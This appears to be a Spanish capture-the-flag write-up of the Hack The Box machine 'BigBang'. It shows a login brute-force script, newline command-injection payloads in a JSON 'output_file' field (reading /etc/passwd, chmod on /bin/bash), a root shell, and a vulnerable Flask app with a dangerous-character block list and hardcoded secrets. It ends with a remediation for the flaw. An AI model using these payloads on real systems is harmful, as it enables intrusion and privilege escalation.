 <br><br>Empezamos por enumerar los usuarios del sistema que manejen una bash<br>shawking@bigbang:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
george:x:1000:1000:George Hubble:/home/george:/bin/bash
shawking:x:1001:1001:Stephen Hawking,,,:/home/shawking:/bin/bash
developer:x:1002:1002:,,,:/home/developer:/bin/bash
<br>Parece que tenemos dos usuarios mas escalables en el sistema; george y developer. Guardaremos la infor para mas adelante.<br>Sudo -l :<br>
not my luckiest day...<br>shawking@bigbang:~$ sudo -l
[sudo] password for shawking: 
Sorry, user shawking may not run sudo on bigbang.
<br>Cron:<br>shawking@bigbang:~$ crontab -e
no crontab for shawking - using an empty one
<br>Netstat<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:3306         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:42669         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -       
<br>Puede que tengamos algo jugosillo en ese puerto 9090<br>Intento hacer pivoting para ver que hay en ese puerto 9090<br>
pero nada;<br>
<img alt="Pasted image 20250204001637.png" src="machines/bigbang/imgs/pasted-image-20250204001637.png"><br>shawking@bigbang:~$ nc -nz 127.0.0.1 9090
shawking@bigbang:~$ echo $?
0

<br>Parece que el puerto funciona;<br>Probamos el puerto con un tunel ssh:<br>ssh shawking@bigbang.htb -L 9090:127.0.0.1:9090
<br>Escaneando con FeroxBuster encontramos un /login y un /command en la pagina web<br>405      GET        5l       20w      153c http://127.0.0.1:9090/login
405      GET        5l       20w      153c http://127.0.0.1:9090/command

<br><img alt="Pasted image 20250204110951.png" src="machines/bigbang/imgs/pasted-image-20250204110951.png"><br>Nos da un 405<br>
<img alt="Pasted image 20250204111114.png" src="machines/bigbang/imgs/pasted-image-20250204111114.png"><br><br>Segun nuestro analisis previo el endpoint en el :9090 es un servidor web<br>sudo nmap -sCV -Pn -n -p 9090 127.0.0.1 --script http-methods      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-05 11:46 CET
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.83% done; ETC: 11:46 (0:00:00 remaining)
Nmap scan report for 127.0.0.1
Host is up (0.000069s latency).

PORT     STATE SERVICE VERSION
9090/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.10.12)
|_http-server-header: Werkzeug/3.0.3 Python/3.10.12

<br>Fuzz:<br>
del fuzz sacamos los siguientes endpoints<br>
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://127.0.0.1:9090/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 404ms]
command                 [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 177ms]
<br>Endpoints:<br>
<a rel="noopener nofollow" class="external-link" href="http://127.0.0.1:9090/login" target="_blank">http://127.0.0.1:9090/login</a><br>
<a rel="noopener nofollow" class="external-link" href="http://127.0.0.1:9090/command" target="_blank">http://127.0.0.1:9090/command</a><br><br>Vamos a hacer bruteforce para intentar entrar como el usuario "developer" en <a rel="noopener nofollow" class="external-link" href="http://127.0.0.1:9090/login" target="_blank">http://127.0.0.1:9090/login</a><br>#!/bin/bash


URL="http://127.0.0.1:9090/login"

PASSWORD_FILE="/usr/share/wordlists/rockyou.txt"


USERNAME="developer"


while IFS= read -r PASSWORD; do
  echo "Probando pass: $PASSWORD"

  RESPONSE=$(curl -X POST -s -o /dev/null -w "%{http_code}" "$URL" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\"}")

  
  if [ "$RESPONSE" != "405" ]  &amp;&amp; [ "$RESPONSE" != "401" ]; then
    echo "¡Contraseña encontrada! -&gt; $PASSWORD"
    echo "respuesta: $RESPONSE"
    break
  fi
done &lt; $PASSWORD_FILE

<br>bingo bingo bingo<br>¡Contraseña encontrada! -&gt; bigbang
respuesta: 200
<br><br>Podemos loguearnos al usuario developer con la misma password; en ella encontramos un archivo .apk en al siguiente ruta :<br>
/home/developer/android/satellite-app.apk<br><br>➜  9090 curl -X POST -v 127.0.0.1:9090/login \    
-H "Content-Type: application/json" \
-d '{"username":"developer","password":"bigbang"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 127.0.0.1:9090...
* Connected to 127.0.0.1 (127.0.0.1) port 9090
* using HTTP/1.x
&gt; POST /login HTTP/1.1
&gt; Host: 127.0.0.1:9090
&gt; User-Agent: curl/8.11.1
&gt; Accept: */*
&gt; Content-Type: application/json
&gt; Content-Length: 45
&gt; 
* upload completely sent off: 45 bytes
&lt; HTTP/1.1 200 OK
&lt; Server: Werkzeug/3.0.3 Python/3.10.12
&lt; Date: Tue, 04 Feb 2025 10:28:53 GMT
&lt; Content-Type: application/json
&lt; Content-Length: 356
&lt; Connection: close
&lt; 
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczODY2NDkzMywianRpIjoiZmM5OGUzYzMtMTJlNy00MjYwLWFlZmEtZGMzZjlhMThhNGMwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczODY2NDkzMywiY3NyZiI6IjIyNjBlMzBhLWNkY2YtNDYzZS1iZmZiLTUwYjNjNWEwZTIzNiIsImV4cCI6MTczODY2ODUzM30.oNh4nYggI9d8ue_IrB3yaV9luehyMiMYeQW3dgEOcm8"}
* shutting down connection #0

<br><br>Get no esta permitido pues probamos nuestra vieja confiable POST<br>
<img alt="Pasted image 20250205114416.png" src="machines/bigbang/imgs/pasted-image-20250205114416.png"><br>Permite POST:<br>shawking@bigbang:/home/shawking$ curl -X POST http://localhost:9090/command
{"msg":"Missing Authorization Header"}
<br>Para el authorization Header vamos a probar con el access_token que nos proporciono la pagina web en el /login<br>-H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczODc1NDkzMSwianRpIjoiMzU5MGRjODMtNjNjMC00OTgxLWI2NDQtZjQyODFhOWE1MjdmIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczODc1NDkzMSwiY3NyZiI6IjU1YmYyYjRkLTlkNTMtNGZlNS1hMDBkLWI5ZjJlYjRkYjhmOSIsImV4cCI6MTczODc1ODUzMX0.-FKF_--KXab_qc0LqvhSow5fIviN5YBPO6tS1QoW3wE"
<br>El endpoint acepta JSON data en este formato:<br>`{     
"command": "send_image",
"output_file": "works.jpg"
}`
<br><img alt="Pasted image 20250205123032.png" src="machines/bigbang/imgs/pasted-image-20250205123032.png"><br>la variable output_file puede estar mal sanitizada  y llevarnos a rce vamos a probar<br><br>{
    "command": "send_image",
    "output_file": "test.png&amp;whoami"
}
<br>Response:<br>{"error":"Output file path contains dangerous characters"}
<br>Con \n:<br>{
    "command": "send_image",
    "output_file": "test.png\nwhoami"
}
<br>Response:<br>{"error":"Error reading image file: [Errno 2] No such file or directory: 'test.png\\nwhoami'"}
<br>Vemos que busca un directorio, vamos a probar a leer archivos;<br>{
    "command": "send_image",
    "output_file": "nothing.png\n../../../../../etc/passwd"

}
<br>{"error":"Error generating image: /bin/sh: 2: ../../../../../etc/passwd: Permission denied\n"}
<br>Podemos cambiar los permisos del bash<br>{
    "command": "send_image",
    "output_file": "nothing.png\n../../../../../usr/bin/chmod 777 /bin/bash"

}
<br>{"error":"Output file path contains dangerous characters"}

<br>Sin embargo desde shawking:<br>shawking@bigbang:/var$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# ls -la /bin/bash
-rwsrwxrwx 1 root root 1396520 Mar 14  2024 /bin/bash
<br>]]></description><link>machines/bigbang/03-user-shawking.html</link><guid isPermaLink="false">Machines/BigBang/03-User-Shawking.md</guid><pubDate>Wed, 05 Feb 2025 12:23:15 GMT</pubDate><enclosure url="machines/bigbang/imgs/pasted-image-20250204001637.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/bigbang/imgs/pasted-image-20250204001637.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Docker]]></title><description><![CDATA[ 
 <br><br>Vemos los recursos docker de la maquina :<br>CONTAINER ID   IMAGE                       COMMAND                  CREATED        STATUS                 PORTS                                        NAMES
de64f0959084   grafana/grafana             "/run.sh"                8 months ago   Up 2 hours             127.0.0.1:3000-&gt;3000/tcp                     grafana
bf9a078a3627   php:8.3.2-apache            "docker-php-entrypoi…"   8 months ago   Up 2 hours             0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp            apache-server
14031fdccc6a   mysql/mysql-server:latest   "/entrypoint.sh mysq…"   8 months ago   Up 2 hours (healthy)   172.17.0.1:3306-&gt;3306/tcp, 33060-33061/tcp   mysql-server

<br><br>Este es el proceso root que permite la escalada de privilegios:<br>root@bigbang:~# ps -aux

root        1751  1.0  1.8 1199704 73656 ?       Ssl  10:32   2:31 /usr/bin/python3 /root/satellite/app.py

<br>En el el directorio /root encontramos el script de  lo que parece el servidor web 9090, vemos que esta desarrollado en flask y que parece el backend que maneja la base de datos<br>root@bigbang:~# cat satellite/app.py 
from flask import Flask, request, jsonify, send_file
from flask_sqlalchemy import SQLAlchemy
from flask_bcrypt import Bcrypt
from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity
from io import BytesIO
from PIL import Image
import random
import datetime
import numpy as np
import subprocess

app = Flask(__name__)

# Update the following line with your MySQL database connection details
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://satellite_user:satellite_password@172.17.0.1/satellite_db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['JWT_SECRET_KEY'] = 'gUX2sShwFlHJ9MBwoXwWNghwuMenSpoi5wIL12kzXfVuNzh7G9WMysTNlnWyvvvD'

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)
jwt = JWTManager(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(200), nullable=False)

class Location(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    x = db.Column(db.Float, nullable=False)
    y = db.Column(db.Float, nullable=False)
    z = db.Column(db.Float, nullable=False)
    timestamp = db.Column(db.DateTime, nullable=False, default=datetime.datetime.utcnow)

def create_tables():
    with app.app_context():
        db.create_all()

create_tables()

def contains_dangerous_chars(input_str):
    dangerous_chars = [
        ';',  # Separador de comandos
        "'",  # Comilla simple
        '"',  # Comilla doble
        '\\',  # Barra invertida
        '&amp;',  # Ejecución en paralelo
        '|',  # Pipe
        '$',  # Expansión de variables
        '(',  # Paréntesis de apertura
        ')',  # Paréntesis de cierre
        '&gt;',  # Redirección de salida
        '&lt;',  # Redirección de entrada
        '`',  # Acento grave
        '!',  # Ejecución de comandos del historial
        '+',  # Puede ser usado en algunos contextos para comandos
        '#',  # Comentarios en shell
        '*',  # Wildcard (comodín)
        '?',  # Wildcard (comodín)
        '[',  # Inicio de clase de caracteres en expresiones regulares
        ']',  # Fin de clase de caracteres en expresiones regulares
        '{',  # Inicio de bloque de comandos o parámetros en algunas shells
        '}',  # Fin de bloque de comandos o parámetros en algunas shells
        '^',  # Redirección de error en algunas shells
        '%'  # Puede tener usos especiales en algunas shells
    ]
    return any(char in input_str for char in dangerous_chars)

@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username', None)
    password = request.json.get('password', None)
    if not username or not password:
        return jsonify({'error': 'Missing username or password'}), 400
    user = User.query.filter_by(username=username).first()
    if not user or not bcrypt.check_password_hash(user.password, password):
        return jsonify({'error': 'Bad username or password'}), 401
    access_token = create_access_token(identity=username, expires_delta=datetime.timedelta(hours=1))
    return jsonify(access_token=access_token), 200

@app.route('/command', methods=['POST'])
@jwt_required()
def command():
    command = request.json.get('command', '').lower()
    current_username = get_jwt_identity()

    # Retrieve the User object corresponding to the username
    current_user = User.query.filter_by(username=current_username).first()

    if not current_user:
        return jsonify({'error': 'User not found'}), 404

    if command == 'move':
        try:
            x = float(request.json.get('x'))
            y = float(request.json.get('y'))
            z = float(request.json.get('z'))
        except (TypeError, ValueError):
            return jsonify({'error': 'Invalid coordinates. Please provide numeric values for x, y, and z.'}), 400

        # Save the coordinates into the database
        location = Location(user_id=current_user.id, x=x, y=y, z=z)
        db.session.add(location)
        db.session.commit()

        return jsonify({'status': f'{current_username} is moving to coordinates ({x}, {y}, {z})'})

    elif command == 'send_image':
        output_file = request.json.get('output_file')
        if not output_file:
            return jsonify({'error': 'Output file path must be provided'}), 400
        if contains_dangerous_chars(output_file):
            return jsonify({'error': 'Output file path contains dangerous characters'}), 400
        try:
            image_data = generate_random_image(output_file)
            return send_file(BytesIO(image_data), mimetype='image/png')
        except RuntimeError as e:
            return jsonify({'error': str(e)}), 500
    else:
        return jsonify({'error': 'Invalid command'}), 400

def generate_random_image(output_file):
    try:
        result = subprocess.run(f'/usr/local/bin/image-tool --get-image {output_file}', 
                                check=True, shell=True, capture_output=True, text=True)
        print(f"STDOUT: {result.stdout}")  # Log the standard output
        print(f"STDERR: {result.stderr}")  # Log the standard error
    except subprocess.CalledProcessError as e:
        print(f"Error executing image-tool: {e.stderr}")
        raise RuntimeError(f'Error generating image: {e.stderr}')
    
    try:
        with open(output_file, 'rb') as file:
            return file.read()
    except Exception as e:
        raise RuntimeError(f'Error reading image file: {str(e)}')

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=9090)

<br>El script importa varias bibliotecas clave:<br>
<br>Flask : Para crear la aplicación web.
<br>SQLAlchemy : Para interactuar con una base de datos MySQL.
<br>Flask-Bcrypt : Para cifrar contraseñas de usuario.
<br>Flask-JWT-Extended : Para manejar tokens JWT (JSON Web Tokens) para la autenticación.
<br>Pillow (PIL) : Para manipular imágenes.
<br>Subprocess : Para ejecutar comandos externos.
<br>En esta parte del codigo podemos observar la vulnerabilidad que permite la escalada de privilegios:<br>    elif command == 'send_image':
        output_file = request.json.get('output_file')
        if not output_file:
            return jsonify({'error': 'Output file path must be provided'}), 400
        if contains_dangerous_chars(output_file):
            return jsonify({'error': 'Output file path contains dangerous characters'}), 400
        try:
            image_data = generate_random_image(output_file)
            return send_file(BytesIO(image_data), mimetype='image/png')
        except RuntimeError as e:
            return jsonify({'error': str(e)}), 500
    else:
        return jsonify({'error': 'Invalid command'}), 400

def generate_random_image(output_file):
    try:
        result = subprocess.run(f'/usr/local/bin/image-tool --get-image {output_file}', 
                                check=True, shell=True, capture_output=True, text=True)
        print(f"STDOUT: {result.stdout}")  # Log the standard output
        print(f"STDERR: {result.stderr}")  # Log the standard error
    except subprocess.CalledProcessError as e:
        print(f"Error executing image-tool: {e.stderr}")
        raise RuntimeError(f'Error generating image: {e.stderr}')
    
    try:
        with open(output_file, 'rb') as file:
            return file.read()
    except Exception as e:
        raise RuntimeError(f'Error reading image file: {str(e)}')    
<br>El uso de shell=True aumenta significativamente el riesgo de inyección de comandos porque permite que el shell interprete la cadena completa.<br><br>
<br>Como se mencionó anteriormente, cualquier carácter especial en output_file puede ser interpretado como parte del comando.
<br><br>
<br>Evitar usar shell=True siempre que sea posible. En su lugar, pasar los argumentos como una lista:
<br>subprocess.run(['/usr/local/bin/image-tool', '--get-image', output_file], check=True, capture_output=True, text=True)
]]></description><link>machines/bigbang/04-post-exploit.html</link><guid isPermaLink="false">Machines/BigBang/04-Post-Exploit.md</guid><pubDate>Wed, 05 Feb 2025 14:36:58 GMT</pubDate></item><item><title><![CDATA[BigBang]]></title><description><![CDATA[<a class="tag" href="?query=tag:machine" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#machine</a> 
 <br><br> <img src="https://www.hackthebox.com//storage/avatars/2d22afd496c5ae6f6c51ca24bf3719e1.png" referrerpolicy="no-referrer"> <br><a href=".?query=tag:machine" class="tag" target="_blank" rel="noopener nofollow">#machine</a><br><br><img src="lib/media/linux.png" style="max-width:70px" referrerpolicy="no-referrer"><br><br><br>
id:: 645
active:: True
name:: BigBang
os::Linux
user_flag:: True
root_flag:: True
difficulty_text:: Hard
stars:: 4.0
created:: 02/05/2025
published:: 01/25/25
avatar:: /storage/avatars/2d22afd496c5ae6f6c51ca24bf3719e1.png
tags:: 
]]></description><link>machines/bigbang/bigbang.html</link><guid isPermaLink="false">Machines/BigBang/BigBang.md</guid><pubDate>Wed, 05 Feb 2025 15:15:21 GMT</pubDate><enclosure url="https://www.hackthebox.com//storage/avatars/2d22afd496c5ae6f6c51ca24bf3719e1.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.hackthebox.com//storage/avatars/2d22afd496c5ae6f6c51ca24bf3719e1.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>